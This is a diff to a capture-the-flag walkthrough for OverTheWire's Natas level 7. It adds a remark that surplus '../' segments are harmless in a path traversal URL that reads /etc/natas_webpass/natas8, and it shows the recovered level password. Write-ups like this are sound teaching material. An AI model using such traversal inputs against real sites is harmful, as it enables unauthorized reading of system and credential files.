@@ -11,6 +11,9 @@ Lets check the viewsource of the website :
 ```
 So we now know that the server is hosted on a unix / linux server we can do something like this:
 http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8
+
+
+BTW we don't know how many "/.." we need to write so if we add extra "/.." will have no effect.
 ```
 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
 ```
